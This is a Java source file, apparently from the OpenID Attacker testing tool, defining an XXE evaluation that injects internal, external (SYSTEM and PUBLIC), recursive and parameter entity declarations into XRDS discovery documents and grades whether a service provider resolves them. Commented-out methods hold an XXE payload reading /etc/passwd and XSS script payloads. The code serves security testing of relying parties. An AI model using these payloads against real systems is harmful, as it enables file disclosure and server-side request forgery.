/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import org.apache.commons.lang3.SerializationUtils;
import wsattacker.sso.openid.attacker.discovery.html.HtmlDiscoveryConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;

/**
 *
 * @author christiankossmann
 */
public class XxeAttack extends AbstractAttack {

    private String xrdsDocument;
    private final String urlIdp;
    private HtmlDiscoveryConfiguration htmlConfigCopy;
    
    public XxeAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
        
        // get URL of IdP
        urlIdp = serverController.getAttackerConfig().getHtmlConfiguration().getBaseUrl();
    }

    @Override
    protected void beforeAttack() {
        super.beforeAttack();
        
        // save XRDS document
        xrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        
        // save HTML discovery by serialization
        HtmlDiscoveryConfiguration htmlConfig = serverController.getConfig().getHtmlConfiguration();
        htmlConfigCopy = SerializationUtils.clone(htmlConfig);
        
        // disable HTML discovery
        htmlConfig.setIncludeIdentity(false);
        htmlConfig.setOpenidServer(false);
        htmlConfig.setOpenId2Provider(false);
    }

    @Override
    protected void afterAttack() {
        super.afterAttack();
        
        // restore XRDS document
        serverController.getConfig().getXrdsConfiguration().setXml(xrdsDocument);
        
        // reset HTML Discovery information
        serverController.getConfig().setHtmlConfiguration(htmlConfigCopy);
    }
    
    @Attack(number = 0)
    private AttackResult performEntitiesAllowedAttack() {
        String doctypeDeclaration = String.format(
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY url '%s'>\n" +
                "]>\n\n", urlIdp + "xxe");
        
        String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&url;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.RESTRICTED;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("Entities allowed?", loginResult, result, interpretation);
    }
    
    @Attack(number = 2)
    private AttackResult performExternalSystemEntitiesAllowed() {
        String doctypeDeclaration = String.format(
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY url SYSTEM '%s'>\n" +
                "]>\n\n", urlIdp + "xxe");
        
        String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&url;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.CRITICAL;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("External Entities allowed (SYSTEM)?", loginResult, result, interpretation);
    }
    
    @Attack(number = 3)
    private AttackResult performExternalPublicEntitiesAllowed() {
        String doctypeDeclaration = String.format(
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY url PUBLIC 'm' '%s'>\n" +
                "]>\n\n", urlIdp + "xxe");
        
        String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&url;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.CRITICAL;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("External Entities allowed (PUBLIC)?", loginResult, result, interpretation);
    }
    
    @Attack(number = 1)
    private AttackResult performRecursiveEntitesAllowed() {
        String doctypeDeclaration = String.format(
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY url1 \"http://my-idp.xyz/x\">\n" +
                "  <!ENTITY url2 \"xe\">\n" +
                "  <!ENTITY url3 \"&url1;&url2;\">\n" +
                "]>\n\n");//, urlIdp + "/x", "xe");
        
        String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&url3;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.CRITICAL;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("Recursive Entities allowed?", loginResult, result, interpretation);
    }
    
    @Attack(number = 4)
    private AttackResult performSystemParameterEntitesAllowed() {
        String doctypeDeclaration = 
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY % dtd SYSTEM \"" + (urlIdp + "xxe") + "\">\n" +
                "%dtd;]>\n\n";
    
        String baseUrl = serverController.getConfig().getXrdsConfiguration().getBaseUrl();
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        //currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&urlIdp3;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.CRITICAL;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("Parameter Entities (SYSTEM) allowed?", loginResult, result, interpretation);
    }
    
    @Attack(number = 5)
    private AttackResult performPublicParameterEntitesAllowed() {
        String doctypeDeclaration = 
                "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY % dtd PUBLIC 'm' \"" + (urlIdp + "xxe") + "\">\n" +
                "%dtd;]>\n\n";
    
        
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        //currentXrdsDocument = currentXrdsDocument.replace(baseUrl, "&urlIdp3;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument; 
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
       
        LoginResult loginResult = serviceProvider.login(User.ATTACKER_RANDOM);
       
        Result result;
        Interpretation interpretation;
        
        if (loginResult.hasXxe()) {
            result = Result.SUCCESS;
            interpretation = Interpretation.CRITICAL;
        } else {
            result = Result.FAILURE;
            interpretation = Interpretation.PREVENTED;
        }
        
        if (!loginResult.hasXrdsDiscovery()) {
            result = Result.NOT_DETECTABLE;
            interpretation = Interpretation.NEUTRAL;
        }
        
        return new AttackResult("Parameter Entities (PUBLIC) allowed?", loginResult, result, interpretation);
    }
    
    /*@Attack(number = 5)
    private AttackResult performXxe() {
        String doctypeDeclaration = "<!DOCTYPE XRDS [\n" +
                "  <!ENTITY xxe SYSTEM '/etc/passwd'>\n" +
                "]>\n\n";
        
        serverController.getConfig().getXrdsConfiguration().setIncludeIdentity(true);
        serverController.getConfig().getXrdsConfiguration().setIdentity("xxx");
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace("xxx", "&xxe;");
        currentXrdsDocument = doctypeDeclaration + currentXrdsDocument;
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
        
        System.out.println(currentXrdsDocument);
        
        LoginResult loginResult = serviceProvider.login(User.ATTACKER);
        
        return new AttackResult("xxe", loginResult, Result.SUCCESS, Interpretation.CRITICAL);
    }*/
    
    /*@Attack(number = 6)
    private AttackResult performXss() {
        
        AttackParameter claimedIdParameter = keeper.getParameter("openid.sreg.nickname");
        claimedIdParameter.setAttackValueUsedForSignatureComputation(true);
        claimedIdParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        claimedIdParameter.setAttackMethod(HttpMethod.GET);
        claimedIdParameter.setAttackValue("<script>alert('1');</script>");
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(ServiceProvider.User.RANDOM);

        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult("xss", loginResult, Result.SUCCESS, Interpretation.CRITICAL);
    }*/
    
    /*@Attack(number = 6)
    private AttackResult performXXS() {        
        serverController.getConfig().getXrdsConfiguration().setIncludeIdentity(true);
        serverController.getConfig().getXrdsConfiguration().setIdentity("xxx");
        
        String currentXrdsDocument = serverController.getConfig().getXrdsConfiguration().getXml();
        currentXrdsDocument = currentXrdsDocument.replace("xxx", "<script>alert('1')</script>");
        serverController.getConfig().getXrdsConfiguration().setXml(currentXrdsDocument);
        
        System.out.println(currentXrdsDocument);
        
        LoginResult loginResult = serviceProvider.login(User.ATTACKER);
        
        return new AttackResult("xxe", loginResult, Result.SUCCESS, Interpretation.CRITICAL);
    }*/
}